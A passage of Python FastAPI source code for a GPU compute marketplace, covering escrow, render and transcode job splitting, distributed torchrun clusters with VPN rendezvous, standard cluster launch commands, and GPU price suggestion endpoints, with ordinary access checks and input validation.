            "platform_fee": b.platform_fee, "seller_payout": b.seller_payout,
            "routing_explanation": rd.explanation if rd else None,
            "routing_decision_id": rd.id if rd else None}


@app.get("/routing/decisions/{decision_id}", tags=["compute"])
def routing_decision_detail(decision_id: int, user: dict = Depends(get_current_user),
                            db: Session = Depends(get_db)):
    """The full audit record of one placement: the intent, every eligible candidate
    with its factor scores, the selection, and the plain-language reason. Visible to
    the buyer who triggered it (and admins)."""
    from db import RoutingDecision
    me = get_user_by_username(db, _username(user))
    rd = db.query(RoutingDecision).filter(RoutingDecision.id == decision_id).first()
    if not rd or not me or (rd.user_id != me.id and not _is_admin(me)):
        raise HTTPException(status_code=404, detail="Decision not found")
    return {"decision_id": rd.id, "source": rd.source,
            "booking_id": rd.booking_id,
            "intent": json.loads(rd.intent),
            "candidates": json.loads(rd.candidates),
            "selected_spec_ids": json.loads(rd.selected_spec_ids),
            "explanation": rd.explanation, "fulfilled": rd.fulfilled,
            "created_at": rd.created_at.isoformat() if rd.created_at else None}


@app.post("/bookings/{booking_id}/release")
def release_endpoint(booking_id: int, user: dict = Depends(get_current_user),
                     db: Session = Depends(get_db)):
    """Buyer accepts the work and releases escrow to the seller."""
    from db import Booking
    me = get_user_by_username(db, _username(user))
    b = db.query(Booking).filter(Booking.id == booking_id).first()
    if not b or not me or b.buyer_id != me.id:
        raise HTTPException(status_code=404, detail="Booking not found")
    if not release_booking(db, booking_id):
        raise HTTPException(status_code=409, detail="Booking already settled")
    return {"status": "ok", "booking_status": "released"}



# ------------------- TEMPLATES (one-click deploy) -------------------

def split_frames(start: int, end: int, n: int):
    """Split [start,end] into n contiguous, roughly equal frame chunks."""
    total = end - start + 1
    n = max(1, min(n, total))
    base, extra = divmod(total, n)
    chunks, cur = [], start
    for i in range(n):
        size = base + (1 if i < extra else 0)
        chunks.append((cur, cur + size - 1))
        cur += size
    return chunks


@app.post("/uploads/url")
def upload_url(data: UploadUrlModel, user: dict = Depends(get_current_user),
               db: Session = Depends(get_db)):
    """Buyer one-click upload: a pre-signed PUT for a job input (e.g. a video),
    stored under the buyer's own prefix. Returns the ref to pass to /transcode."""
    me = get_user_by_username(db, _username(user))
    from utils import s3_key_for, s3_uri, mint_presigned_put
    key = f"inputs/{me.id}/" + __import__("os").path.basename(data.filename)
    try:
        url = mint_presigned_put(key)
    except ValueError as e:
        raise HTTPException(status_code=503, detail=str(e))
    return {"upload_url": url, "ref": s3_uri(key), "key": key, "expires_in": 900}


def _book_segment_task(db, buyer, spec, hours, task_type):
    gross = round(spec.price_per_hour * hours, 4)
    if not try_reserve_unit(db, spec.id):
        return None
    if not try_debit(db, buyer.id, gross):
        release_unit(db, spec.id); return None
    booking = book_with_escrow(db, buyer, spec, hours, False, PLATFORM_TAKE_RATE)
    task = create_task(db, booking, task_type)
    mark_booking_active(db, booking.id)
    return task


def _advance_manifest(db, task, result_ref):
    """Progress a fan-out job when a segment or the stitch task completes."""
    from db import MultiNodeJob
    stitched = db.query(MultiNodeJob).filter(MultiNodeJob.stitch_task_id == task.id).first()
    if stitched:                                   # the assembly finished
        set_job_status(db, stitched, "complete", output_ref=result_ref)
        return
    seg = segment_for_task(db, task.id)
    if not seg:
        return
    job = complete_segment(db, seg, result_ref)
    if job and job.status == "running" and all_segments_done(db, job):
        if job.kind == "distributed":
            # A coordinated cluster has no stitch step — it is done when every rank finishes.
            set_job_status(db, job, "complete", output_ref=result_ref)
        else:
            _finalize_job(db, job)


def _fail_distributed_if_member(db, task):
    """A distributed cluster is gang-scheduled: if any rank dies, the run can't continue, so the
    whole job is marked failed. (Escrow on the other ranks is retained/retryable or refunded by
    the buyer cancel path — same as any failed job.)"""
    seg = segment_for_task(db, task.id)
    if not seg:
        return
    job = get_multinode_job(db, seg.job_id)
    if job and job.kind == "distributed" and job.status == "running":
        set_job_status(db, job, "failed")


def _finalize_job(db, job):
    """All segments done -> book one node to concat/collect into the final output."""
    from db import Task
    refs = segment_output_refs(db, job)
    buyer = get_user_by_id(db, job.buyer_id)
    spec = None
    segs = job_segments(db, job.id)
    if segs:
        t0 = db.query(Task).filter(Task.id == segs[0].task_id).first()
        cand = _get_spec(db, t0.spec_id) if t0 else None
        if cand and spec_is_live(cand) and (cand.available_units or 0) > 0:
            spec = cand
    if spec is None:
        picks = select_plan(db, {"workload": job.kind, "redundancy": 1, "hours": 1})["selected"]
        spec = _get_spec(db, picks[0]["spec_id"]) if picks else None
    if not buyer or not spec:
        set_job_status(db, job, "assembling"); return
    task = _book_segment_task(db, buyer, spec, 1, "stitch")
    if not task:
        set_job_status(db, job, "assembling"); return
    params = json.loads(job.params or "{}")
    task.template_params = json.dumps({"job_id": job.id, "kind": job.kind,
                                       "segment_refs": refs,
                                       "container": params.get("container", "mp4"),
                                       "output_prefix": f"{job.kind}/{job.id}/final/"})
    db.add(task); db.commit()
    set_job_status(db, job, "assembling", stitch_task_id=task.id)


@app.post("/transcode")
def transcode_job(data: TranscodeModel, user: dict = Depends(get_current_user),
                  db: Session = Depends(get_db)):
    """Split a video into N time segments, transcode each on a router-selected node
    (NVENC), and assemble via a stitch step. Single node if nodes=1."""
    buyer = get_user_by_username(db, _username(user))
    if not _ref_is_own_input(data.input_ref, buyer.id):
        raise HTTPException(status_code=422,
                            detail="input_ref must be an object you uploaded (inputs/<your id>/…)")
    intent = {"workload": "transcode", "redundancy": data.nodes, "hours": data.hours,
              "gpu_class": data.gpu_class, "region": data.region}
    picks = select_plan(db, intent)["selected"][:data.nodes]
    if not picks:
        raise HTTPException(status_code=409, detail="No verified node fits the transcode")
    n = len(picks)
    dur = data.duration_seconds or 0
    if dur and n > 1:
        seg = split_frames(0, dur - 1, n)          # reuse contiguous splitter (seconds)
    else:
        seg = [(0, dur - 1 if dur else -1)]         # single node = whole file
        picks = picks[:1]; n = 1
    params = {"input_ref": data.input_ref, "codec": data.codec,
              "resolution": data.resolution, "bitrate": data.bitrate, "crf": data.crf,
              "container": data.container, "use_gpu": data.use_gpu}
    job = create_multinode_job(db, buyer, "transcode", params, n)
    tasks = []
    for i, (sel, (ss, se)) in enumerate(zip(picks, seg)):
        spec = _get_spec(db, sel["spec_id"])
        task = _book_segment_task(db, buyer, spec, data.hours, "transcode")
        if not task:
            continue
        task.template_params = json.dumps({**params, "job_id": job.id, "segment": i,
                                           "start_time": ss, "end_time": se,
                                           "output_prefix": f"transcode/{job.id}/seg{i}/"})
        task.volume = "transcode-out"; db.add(task); db.commit()
        add_job_segment(db, job, i, task.id, ss, se)
        tasks.append({"spec_id": spec.id, "task_id": task.id, "segment": [ss, se]})
    if not tasks:
        raise HTTPException(status_code=402, detail="Could not book any node")
    return {"status": "ok", "job_id": job.id, "kind": "transcode", "nodes": len(tasks),
            "segments": tasks, "manifest_url": f"/jobs/manifest/{job.id}"}


@app.get("/jobs/manifest/{job_id}")
def job_manifest(job_id: int, user: dict = Depends(get_current_user),
                 db: Session = Depends(get_db)):
    job = get_multinode_job(db, job_id)
    me = get_user_by_username(db, _username(user))
    # Owner-only: the manifest exposes every segment's output_ref + task ids. Without this,
    # any authenticated buyer could enumerate another tenant's jobs by id (IDOR). 404 (not
    # 403) so a foreign id is indistinguishable from a non-existent one.
    if not job or not me or (job.buyer_id != me.id and not _is_admin(me)):
        raise HTTPException(status_code=404, detail="Job not found")
    segs = job_segments(db, job_id)
    out = {"job_id": job.id, "kind": job.kind, "status": job.status,
           "total_segments": job.total_segments, "output_ref": job.output_ref,
           "stitch_task_id": job.stitch_task_id,
           "segments": [{"idx": s.idx, "task_id": s.task_id, "range": [s.range_start, s.range_end],
                         "status": s.status, "output_ref": s.output_ref} for s in segs]}
    if job.kind == "distributed":
        # A cluster manifest: world_size, the collective backend, and rank-0's rendezvous address.
        out.update({"world_size": job.total_segments, "backend": job.backend,
                    "master_addr": job.master_addr, "master_port": job.master_port,
                    "rendezvous_ready": bool(job.master_addr),
                    "ranks": [{"rank": s.idx, "task_id": s.task_id, "status": s.status}
                              for s in segs]})
    return out


@app.post("/render")
def render_job(data: RenderModel, user: dict = Depends(get_current_user),
               db: Session = Depends(get_db)):
    """Render-farm: split a frame range across N verified nodes (chosen by the
    router) and dispatch a render task per node. Embarrassingly parallel; a dropped
    frame just re-renders via retry."""
    buyer = get_user_by_username(db, _username(user))
    if not _ref_is_own_input(data.blend_ref, buyer.id):
        raise HTTPException(status_code=422,
                            detail="blend_ref must be an object you uploaded (inputs/<your id>/…)")
    intent = {"workload": "render", "redundancy": data.nodes, "hours": data.hours,
              "gpu_class": data.gpu_class, "region": data.region}
    plan = select_plan(db, intent)
    nodes = plan["selected"][:data.nodes]
    if not nodes:
        raise HTTPException(status_code=409, detail="No verified node fits the render request")
    chunks = split_frames(data.frame_start, data.frame_end, len(nodes))
    job = create_multinode_job(db, buyer, "render",
                               {"blend_ref": data.blend_ref, "samples": data.samples}, len(nodes))
    tasks = []
    for i, (sel, (fs, fe)) in enumerate(zip(nodes, chunks)):
        spec = _get_spec(db, sel["spec_id"])
        task = _book_segment_task(db, buyer, spec, data.hours, "render")
        if not task:
            continue
        task.template_params = json.dumps({"blend_ref": data.blend_ref,
                                           "frame_start": fs, "frame_end": fe,
                                           "samples": data.samples, "job_id": job.id,
                                           "output_prefix": f"render/{job.id}/seg{i}/"})
        task.volume = "render-out"; db.add(task); db.commit()
        add_job_segment(db, job, i, task.id, fs, fe)
        tasks.append({"spec_id": spec.id, "task_id": task.id, "frames": [fs, fe],
                      "price_per_hour": spec.price_per_hour})
    if not tasks:
        raise HTTPException(status_code=402, detail="Could not book any node (funds/capacity)")
    return {"status": "ok", "job_id": job.id, "blend_ref": data.blend_ref, "nodes": len(tasks),
            "frame_range": [data.frame_start, data.frame_end], "tasks": tasks,
            "manifest_url": f"/jobs/manifest/{job.id}",
            "estimated_cost": q(sum((D(t["price_per_hour"]) for t in tasks), D(0)) * D(data.hours))}


# ------------------- DISTRIBUTED COMPUTE (one job across N GPUs on different machines) -------------------
# Split a single job across up to MAX_DISTRIBUTED_NODES GPUs that live on DIFFERENT machines but
# form one cluster over the VPN (torchrun/NCCL all-reduce). The platform gang-schedules N distinct
# nodes (one per provider = never two ranks on the same PC), escrows all-or-nothing, assigns ranks,
# and coordinates rendezvous; each node's agent runs the container under torchrun with its rank.

_HOSTPORT_RE = re.compile(r"^[A-Za-z0-9._:\-\[\]]{1,255}$")   # IPv4/IPv6/hostname (VPN address)

# The built-in cluster SELF-TEST sentinel. When a buyer passes selftest=true, the command is
# rewritten to this so each rank's agent runs a real cross-process all-reduce (proving the ranks
# actually communicate + reduce correctly) instead of a container. MUST match the agent's
# distributed_run.SELFTEST_SENTINEL.
DISTRIBUTED_SELFTEST_SENTINEL = "petabyte:selftest-allreduce"


class DistributedModel(BaseModel):
    image: Optional[str] = Field(None, min_length=3, max_length=300)  # training/compute container image
    command: Optional[str] = Field(None, max_length=8000)   # torchrun target, e.g. "train.py --epochs 3"
    world_size: int = Field(ge=2, le=100)                   # GPUs/ranks (hard cap re-checked below)
    hours: int = Field(ge=1, le=168)
    gpu_class: Optional[str] = Field(None, max_length=64)
    region: Optional[str] = Field(None, max_length=64)
    backend: str = Field("nccl", max_length=16)             # nccl (GPU) | gloo (CPU/fallback)
    env: Optional[dict] = None
    vpn: bool = False                                       # give the buyer a WireGuard tunnel in
    selftest: bool = False                                  # run the built-in cluster all-reduce self-test

    @field_validator("image")
    @classmethod
    def _safe_image(cls, v):
        # `image` is placed on a `docker run … <image> torchrun …` argv (list form, so no shell
        # injection). Still reject a value that begins with '-' (docker option-injection) and
        # constrain to a docker image-reference charset so it can't smuggle flags/paths.
        if v is None:
            return v
        v = v.strip()
        if v.startswith("-"):
            raise ValueError("image must not start with '-'")
        if not re.match(r"^[A-Za-z0-9][A-Za-z0-9_.:/@-]*$", v):
            raise ValueError("image is not a valid container image reference")
        return v


@app.post("/distributed", tags=["compute"])
def distributed_job(data: DistributedModel, user: dict = Depends(get_current_user),
                    db: Session = Depends(get_db)):
    """Run ONE job across N GPUs on N different machines, wired into a single cluster over the VPN.

    The router picks N nodes across DISTINCT providers (never two ranks on the same PC), escrows
    all N up-front (all-or-nothing — a cluster that can't fully form is refused and refunded),
    assigns ranks 0..N-1, and coordinates rendezvous: rank 0 registers its VPN address, the others
    join it (torchrun --nnodes=N). The job completes when every rank finishes; if any rank dies the
    whole run is marked failed (gang semantics).

    Pass `selftest: true` to run the built-in CLUSTER SELF-TEST instead of a container: each rank
    performs a real cross-process all-reduce, proving the N ranks actually communicate and compute
    the correct global reduction — a no-GPU, no-image "does my cluster really work?" smoke test to
    run before committing to a long training job. (image/command are then optional.)"""
    buyer = get_user_by_username(db, _username(user))
    if not buyer:
        raise HTTPException(status_code=401, detail="Unknown user")
    if data.backend not in ("nccl", "gloo"):
        raise HTTPException(status_code=422, detail="backend must be 'nccl' or 'gloo'")
    n = int(data.world_size)
    if n < 2 or n > MAX_DISTRIBUTED_NODES:
        raise HTTPException(status_code=422,
                            detail=f"world_size must be between 2 and {MAX_DISTRIBUTED_NODES}")
    # The self-test needs no buyer image/command; a real training run does. Resolve both here so
    # the dispatched task carries exactly what the agent needs to execute.
    if data.selftest:
        image = data.image or "petabyte/selftest:builtin"   # placeholder — the agent runs no container
        command = DISTRIBUTED_SELFTEST_SENTINEL
    else:
        if not data.image:
            raise HTTPException(status_code=422,
                                detail="image is required (or set selftest=true for the cluster self-test)")
        image, command = data.image, data.command
    env = {str(k): str(v) for k, v in (data.env or {}).items()}
    # Gang-schedule N DISTINCT MACHINES. anti_affinity="spec" spreads ranks by machine (spec), not
    # by owner — so a single user's home lab of N computers (each its own agent + API key + spec)
    # can form the cluster, and so can N machines across N accounts. (Fan-out redundancy still
    # uses the default owner-level anti-affinity elsewhere.)
    intent = {"workload": "distributed", "redundancy": n, "hours": data.hours,
              "gpu_class": data.gpu_class, "region": data.region, "anti_affinity": "spec"}
    nodes = select_plan(db, intent)["selected"]
    if len(nodes) < n:
        obsmod.inc_metric("petabyte_cluster_formations_total", outcome="insufficient_nodes",
                          backend=data.backend, environment=obsmod.ENVIRONMENT)
        raise HTTPException(status_code=409, detail={
            "code": "INSUFFICIENT_DISTINCT_NODES",
            "message": (f"A distributed job needs {n} GPUs on {n} different machines, but only "
                        f"{len(nodes)} distinct machines are online right now. Each computer runs "
                        f"its own agent (its own API key + spec); they can be under one account or "
                        f"several."),
            "requested": n, "available": len(nodes)})
    job = create_distributed_job(db, buyer,
                                 {"image": image, "command": command, "vpn": bool(data.vpn),
                                  "selftest": bool(data.selftest)},
                                 world_size=n, backend=data.backend)
    booked, ranks = [], []
    for rank, sel in enumerate(nodes[:n]):
        spec = _get_spec(db, sel["spec_id"])
        task = _book_segment_task(db, buyer, spec, data.hours, "distributed")
        if not task:
            # All-or-nothing: a cluster missing a rank can't train. Unwind every booked rank
            # (refund escrow + free capacity) so the buyer is charged nothing for a non-cluster.
            for _, bt in booked:
                refund_booking(db, bt.booking_id)
            set_job_status(db, job, "failed")
            obsmod.inc_metric("petabyte_cluster_formations_total", outcome="booking_failed",
                              backend=data.backend, environment=obsmod.ENVIRONMENT)
            raise HTTPException(status_code=402, detail={
                "code": "CLUSTER_BOOKING_FAILED",
                "message": ("Could not reserve every node for the cluster (funds or capacity); "
                            "nothing was charged."),
                "booked": len(booked), "needed": n})
        task.template_params = json.dumps({"job_id": job.id, "rank": rank, "world_size": n,
                                           "backend": data.backend, "image": image,
                                           "command": command, "env": env,
                                           "selftest": bool(data.selftest),
                                           "is_master": rank == 0})
        task.volume = f"dist-{job.id}"; db.add(task); db.commit()
        add_job_segment(db, job, rank, task.id, rank, rank)
        booked.append((spec, task))
        ranks.append({"rank": rank, "spec_id": spec.id, "task_id": task.id,
                      "is_master": rank == 0, "price_per_hour": spec.price_per_hour})
    est = q(sum((D(r["price_per_hour"]) for r in ranks), D(0)) * D(data.hours))
    obsmod.inc_metric("petabyte_cluster_formations_total", outcome="success",
                      backend=data.backend, environment=obsmod.ENVIRONMENT)
    return {"status": "ok", "job_id": job.id, "kind": "distributed", "world_size": n,
            "backend": data.backend, "hours": data.hours, "ranks": ranks,
            "master_rank": 0, "estimated_cost": est, "vpn": bool(data.vpn),
            "vpn_config_url": (f"/jobs/{job.id}/vpn_config" if data.vpn else None),
            "manifest_url": f"/jobs/manifest/{job.id}",
            "rendezvous_url": f"/jobs/rendezvous/{job.id}",
            "note": ("Ranks form one cluster over the VPN. Rank 0 registers its address at "
                     "/jobs/rendezvous; the others poll /jobs/rendezvous/{job_id} to join.")}


@app.get("/distributed/availability", tags=["compute"])
def distributed_availability(gpu_class: Optional[str] = Query(None, max_length=64),
                             region: Optional[str] = Query(None, max_length=64),
                             db: Session = Depends(get_db)):
    """How big a cluster can form right now: the count of DISTINCT bookable MACHINES (one rank per
    machine — a single user may contribute several computers, each its own agent/spec) and a
    representative per-node price, so the app can show the max cluster size and an estimated cost
    before a buyer commits. Aggregate only — no seller identity."""
    import router as _router
    intent = {}
    if gpu_class:
        intent["gpu_class"] = gpu_class
    if region:
        intent["region"] = region
    # One rank per MACHINE (distinct spec), matching /distributed's anti_affinity="spec": a user's
    # multiple computers each count as a bookable node.
    machines = {}
    for cnd in _router.gather_candidates(db, intent):
        machines[cnd["spec"].id] = float(cnd["price"])
    prices = sorted(machines.values())
    est = (prices[len(prices) // 2] if prices else None)   # median per-node $/hr
    return {"available_nodes": len(machines),
            "max_cluster": min(len(machines), MAX_DISTRIBUTED_NODES),
            "max_nodes_cap": MAX_DISTRIBUTED_NODES,
            "est_price_per_hour": est}


class RendezvousModel(BaseModel):
    task_id: int
    host: str = Field(min_length=1, max_length=255)     # this rank's VPN-reachable address
    port: int = Field(gt=0, le=65535)
    slots: int = Field(1, ge=1, le=64)                  # GPUs this rank contributes (mpirun slots)


@app.post("/jobs/rendezvous", tags=["compute"])
def jobs_rendezvous_register(data: RendezvousModel, agent=Depends(api_key_user),
                             db: Session = Depends(get_db)):
    """A rank registers ITS OWN VPN-reachable address for the cluster. Every rank calls this, so the
    whole cluster becomes addressable (an MPI hostfile / Ray address / torchrun rendezvous). Rank 0
    additionally becomes the cluster master. An agent may only register a rank it owns, and only
    rank 0 can set the master — no other rank can hijack it."""
    task = get_task_for_agent(db, data.task_id, agent)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found or not yours")
    job = distributed_job_for_task(db, task.id)
    if not job:
        raise HTTPException(status_code=409, detail="Task is not part of a distributed job")
    seg = segment_for_task(db, task.id)
    if not seg:
        raise HTTPException(status_code=404, detail="No cluster rank for this task")
    if not _HOSTPORT_RE.match(data.host):
        raise HTTPException(status_code=422, detail="host must be an IP/hostname (VPN address)")
    register_peer(db, seg, data.host, data.port, data.slots)   # record THIS rank's address
    if seg.idx == 0:                                            # rank 0 is also the master
        if not set_rendezvous(db, job, data.host, data.port):
            raise HTTPException(status_code=409, detail="Rendezvous already set to a different address")
    return {"status": "ok", "job_id": job.id, "my_rank": seg.idx, "is_master": seg.idx == 0,
            "master_addr": job.master_addr, "master_port": job.master_port,
            "world_size": job.total_segments, "cluster_ready": cluster_ready(db, job)}


@app.get("/jobs/rendezvous/{job_id}", tags=["compute"])
def jobs_rendezvous_get(job_id: int, task_id: Optional[int] = Query(None),
                        agent=Depends(api_key_user), db: Session = Depends(get_db)):
    """A rank fetches everything it needs to join the cluster: its own rank, world_size, the
    backend, and (once rank 0 is up) the master address. Non-master ranks poll until ready=true.
    Only an agent that owns one of the job's ranks may read it.

    `task_id` disambiguates WHICH rank is asking when ONE account owns several ranks in the same
    cluster (a home lab: many computers, one account, distinct API keys — the key resolves to the
    user, so the caller names its own task to get its exact rank). Omitted → the agent's
    first-owned rank (correct when each rank is a different account)."""
    job = get_multinode_job(db, job_id)
    if not job or job.kind != "distributed":
        raise HTTPException(status_code=404, detail="Distributed job not found")
    if task_id is not None:
        task = get_task_for_agent(db, task_id, agent)
        seg = segment_for_task(db, task_id) if task else None
        if not task or not seg or seg.job_id != job.id:
            raise HTTPException(status_code=404, detail="You have no such rank in this job")
        rank = seg.idx
    else:
        seg, rank = rank_for_agent(db, job, agent)
    if seg is None:
        raise HTTPException(status_code=404, detail="You have no rank in this job")
    info = rendezvous_info(db, job)
    info.update({"my_rank": rank, "is_master": rank == 0,
                 "cluster_ready": cluster_ready(db, job)})
    return info


# ---- "Petabyte is just another provider": export the cluster to the tools an org already runs ----
# Big-corp / academic / gov workloads run on Slurm, MPI, Ray, Kubernetes — they will not rewrite
# their stack. These endpoints hand the running cluster back as the standard artifacts those tools
# consume, so adopting Petabyte is "add a node pool", not "change your infrastructure".

def _cluster_launch_cmds(job, peers) -> dict:
    """Ready-to-run commands that drive THIS cluster from the standard launchers."""
    import json as _json
    params = _json.loads(job.params or "{}")
    cmd = params.get("command") or "<your-entrypoint>"
    n = job.total_segments
    total_slots = sum(p["slots"] for p in peers) or n
    master = f"{job.master_addr}:{job.master_port}" if job.master_addr else "<rank0-host>:<port>"
    mhost = job.master_addr or "<rank0-host>"
    mport = job.master_port or 29500
    return {
        "mpirun": f"mpirun --hostfile hostfile -np {total_slots} {cmd}",
        "torchrun": (f"torchrun --nnodes={n} --nproc_per_node=<gpus_per_node> "
                     f"--node_rank=$RANK --rdzv_backend=static "
                     f"--master_addr={mhost} --master_port={mport} {cmd}"),
        "ray_head": f"ray start --head --port={mport}",
        "ray_worker": f"ray start --address={master}",
        "slurm_srun": f"srun --nodes={n} --ntasks={total_slots} {cmd}",
    }


@app.get("/jobs/{job_id}/hostfile", response_class=PlainTextResponse, tags=["compute"])
def cluster_hostfile(job_id: int, user: dict = Depends(get_current_user),
                     db: Session = Depends(get_db)):
    """The cluster as an MPI/torchrun HOSTFILE (`<host> slots=<gpus>` per line). Drop it into your
    existing `mpirun --hostfile` — Petabyte is just another set of nodes. Owner-only."""
    job = get_multinode_job(db, job_id)
    me = get_user_by_username(db, _username(user))
    if not job or job.kind != "distributed" or not me or (job.buyer_id != me.id and not _is_admin(me)):
        raise HTTPException(status_code=404, detail="Distributed job not found")
    peers = cluster_peers(db, job)
    ready = all(p["registered"] for p in peers) if peers else False
    lines = [f"# Petabyte cluster job {job.id}: {sum(1 for p in peers if p['registered'])}/"
             f"{len(peers)} nodes registered (ready={str(ready).lower()})"]
    for p in peers:
        if p["registered"]:
            lines.append(f"{p['host']} slots={p['slots']}")
    return "\n".join(lines) + "\n"


@app.get("/jobs/{job_id}/cluster", tags=["compute"])
def cluster_spec(job_id: int, user: dict = Depends(get_current_user),
                 db: Session = Depends(get_db)):
    """The full cluster spec + ready-to-run launch commands for MPI / torchrun / Ray / Slurm, so
    your existing scheduler treats Petabyte as another node pool. Owner-only."""
    job = get_multinode_job(db, job_id)
    me = get_user_by_username(db, _username(user))
    if not job or job.kind != "distributed" or not me or (job.buyer_id != me.id and not _is_admin(me)):
        raise HTTPException(status_code=404, detail="Distributed job not found")
    peers = cluster_peers(db, job)
    return {"job_id": job.id, "status": job.status, "world_size": job.total_segments,
            "backend": job.backend, "ready": cluster_ready(db, job),
            "master": ({"rank": 0, "host": job.master_addr, "port": job.master_port}
                       if job.master_addr else None),
            "nodes": peers, "hostfile_url": f"/jobs/{job.id}/hostfile",
            "launch": _cluster_launch_cmds(job, peers)}


@app.get("/jobs/{job_id}/vpn_config", response_class=PlainTextResponse, tags=["compute"])
def cluster_vpn_config(job_id: int, user: dict = Depends(get_current_user),
                       db: Session = Depends(get_db)):
    """The buyer's WireGuard CLIENT config for a VPN-enabled distributed cluster — a private,
    encrypted tunnel into the cluster's network. Owner-only; only when the job was launched with
    vpn=true. A fresh keypair is minted per download; the private half lives only in this response
    (the server never keeps it), the public half is registered as a /32 peer."""
    job = get_multinode_job(db, job_id)
    me = get_user_by_username(db, _username(user))
    if not job or job.kind != "distributed" or not me or (job.buyer_id != me.id and not _is_admin(me)):
        raise HTTPException(status_code=404, detail="Distributed job not found")
    try:
        want_vpn = bool(json.loads(job.params or "{}").get("vpn"))
    except Exception:
        want_vpn = False
    if not want_vpn:
        raise HTTPException(status_code=400, detail="This cluster was not launched with VPN")
    client_priv, client_pub = gen_wg_keypair()
    peer = add_wg_peer(db, me, client_pub)               # race-safe /32 allocation
    apply_peer_to_interface(client_pub, peer.address)    # live only when WG_APPLY=true
    return build_client_wg_config(client_priv, peer.address)


@app.post("/solve")
def solve_compute(intent: SolveModel, user: dict = Depends(get_current_user),
                  db: Session = Depends(get_db)):
    """AI Router: state intent, get a placement plan over verified inventory.
    The customer never picks a node — the router selects hardware, region,
    provider, and redundancy to satisfy the constraints at the best blended cost.
    Every decision (inputs, every candidate's factor scores, the outcome) is
    persisted so the placement can be audited later via /routing/decisions/{id}."""
    from db import record_routing_decision
    me = get_user_by_username(db, _username(user))
    plan = select_plan(db, intent.model_dump())
    if not plan["selected"]:
        raise HTTPException(status_code=409, detail="No verified node satisfies these constraints")
    decision = record_routing_decision(
        db, source="solve", user_id=me.id if me else None,
        intent=intent.model_dump(), candidates=plan.pop("candidate_snapshot"),
        selected_spec_ids=plan["selected_spec_ids"],
        explanation=plan["explanation"], fulfilled=plan["fulfilled"])
    plan["decision_id"] = decision.id
    return plan


@app.get("/templates", tags=["compute"])
def list_templates():
    """One-click deployable stacks (Ollama, vLLM, ComfyUI, SD WebUI, TensorRT-LLM)."""
    return {"templates": public_catalog()}


@app.get("/pricing/suggest", tags=["marketplace"])
def suggest_price(gpu_model: Optional[str] = None, db: Session = Depends(get_db)):
    """Suggest an hourly price for a seller listing this GPU. Anchors to what
    similar live nodes charge, else to a discount off the cloud reference. This is
    a *suggestion* — the seller sets their own price. (Full demand-based auto-pricing
    is a documented next step; see the min/max/auto_price fields.)"""
    from db import SellerSpec
    prices = []
    for spec in db.query(SellerSpec).filter(SellerSpec.attested == True).all():  # noqa: E712
        if not spec_is_live(spec):
            continue
        if gpu_model and gpu_model.lower() not in (spec.gpu_model or "").lower():
            continue
        prices.append(spec.price_per_hour)
    # Per-GPU cloud reference (shared table) so a T4 isn't anchored off an H100-class rate.
    # Only fall back to the generic AWS reference when we don't recognise the GPU class.
    import pricing_engine
    cloud_ref = cloud_reference_for(gpu_model)
    perf_ref = pricing_engine.performance_reference_price(gpu_model)
    ref = float(cloud_ref) if cloud_ref is not None else float(AWS_REFERENCE_PRICE)
    if prices:
        prices.sort()
        median = prices[len(prices) // 2]
        suggested, low, high = qc(median), qc(prices[0]), qc(prices[-1])
        basis = f"median of {len(prices)} similar live node(s)"
    elif perf_ref is not None:
        # Benchmark-anchored: guarantees a slower GPU is never suggested above a faster one.
        suggested = qc(D(str(perf_ref)))
        low, high = qc(D(str(perf_ref)) * D("0.80")), qc(D(str(perf_ref)) * D("1.20"))
        basis = "priced on this GPU's FP16 benchmark (a faster card always sits above a slower one)"
    elif cloud_ref is not None:
        suggested = qc(D(ref) * D("0.45"))    # ~55% under THIS GPU's cloud rate when no market yet
        low, high = qc(D(ref) * D("0.30")), qc(D(ref) * D("0.70"))
        basis = "no similar nodes online — anchored ~55% below the cloud reference for this GPU"
    else:
        suggested = qc(D(ref) * D("0.45"))
        low, high = qc(D(ref) * D("0.30")), qc(D(ref) * D("0.70"))
        basis = "unrecognised GPU + no similar nodes online — anchored to a generic cloud reference"
    return {"gpu_model": gpu_model or "any", "suggested_price": suggested,
            "range_low": low, "range_high": high, "market_samples": len(prices),
            "benchmark_reference_price": perf_ref,
            "cloud_reference": round(ref, 2), "cloud_reference_known": cloud_ref is not None,
            "basis": basis,
            "note": "Suggestion only — you set your price. Stay below the cloud reference to win bookings."}


@app.get("/pricing/catalog", tags=["marketplace"])
def pricing_catalog(db: Session = Depends(get_db)):
    """The GPU price catalog: every recognised GPU model, sorted by FP16 benchmark ascending, with
    its benchmark-anchored reference price per hour and the live marketplace average.

    The reference price is a MONOTONIC function of the FP16 TFLOPS benchmark, so a slower GPU is
    never priced above a faster one — the fairness rule the marketplace guarantees. `avg_price_per_hour`
    is the mean over currently-live listings of that model (null when none are online)."""
    import pricing_engine
    import gpu_benchmark
    from db import SellerSpec
    # Live listing prices grouped by canonical GPU model (same normaliser the benchmark uses).
    live_by_model = {}
    for s in db.query(SellerSpec).all():
        if not spec_is_live(s):
            continue
        key = gpu_benchmark.normalize_model(s.gpu_model)
        if key is None:
            continue
        live_by_model.setdefault(key, []).append(float(s.price_per_hour or 0))
    rows = []
    for r in pricing_engine.catalog():
        live = live_by_model.get(r["gpu_model"], [])
        r = dict(r)
        r["live_listings"] = len(live)
        r["avg_price_per_hour"] = round(sum(live) / len(live), 2) if live else None
        r["min_price_per_hour"] = round(min(live), 2) if live else None
        r["max_price_per_hour"] = round(max(live), 2) if live else None
        rows.append(r)
    return {"catalog": rows, "count": len(rows), "sorted_by": "benchmark_tflops_fp16 ascending",
            "note": "Reference price is derived monotonically from the FP16 TFLOPS benchmark: a "
                    "slower GPU is never priced above a faster one. Sellers set their own price; "
                    "this is the fair baseline."}


@app.get("/pricing/roi", tags=["marketplace"])
def pricing_roi(kwh: float = Query(0.12, ge=0, le=2.0),
                hours: float = Query(8.0, ge=0, le=24.0),
                full_build: bool = Query(False),
                db: Session = Depends(get_db)):
    """"Buy a GPU and rent it" ROI + breakeven, per GPU — every term shown so nothing is a black box.

    Earnings come from the SAME benchmark-anchored reference price the marketplace uses (a buyer's
    price), minus Petabyte's fee and electricity, for however many `hours` per day you actually rent
    it out. `full_build=true` accounts for the WHOLE PC (adds a rest-of-build cost + system watts),
    not just the GPU. Hardware cost defaults to published launch MSRP and is meant to be overridden
    with today's real price (the buy links show it). This is a MODEL, not a promise: rented hours
    are demand-dependent and the biggest lever — the response says so."""
    import hardware_reference as hw
    take = float(PLATFORM_TAKE_RATE)
    amz = os.getenv("AFFILIATE_AMAZON_TAG", "").strip()
